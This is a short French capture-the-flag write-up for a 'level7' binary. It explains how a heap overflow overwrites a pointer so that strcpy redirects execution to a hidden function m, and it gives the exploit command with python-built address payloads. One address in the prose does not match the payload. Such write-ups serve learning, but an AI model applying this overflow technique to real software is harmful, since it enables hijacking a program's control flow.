quand on disas main et info functions on a encore une fonction m avec comme address (0x080484f4) qui n'est pas call dans le main

avec ltrace ./level7

on voit qu'il y a 4 malloc de 8
avec comme address : 
0x0804a008 - 1
0x0804a018 - 2
0x0804a028 - 3
0x0804a038 - 4

on a 2 variables malloc qui sont des tableaux

a et b

Pour le premier argument
On se met sur LE DEBUT DU MALLOC a[1] (0x0804a028) + 20 pour arriver a AU DEBUT DE b[1] (0x0804a038)
une fois sur b[1] on lui met b (0x0804a028)

et le 2eme argument qui lui est egal a b (qui a ete modifie par b[1] car c'est lui qui est appele dans strcpy)
on lui met l'adresse de M (0x080484f4)

ce qu'il fait qu'il va appeler M


./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')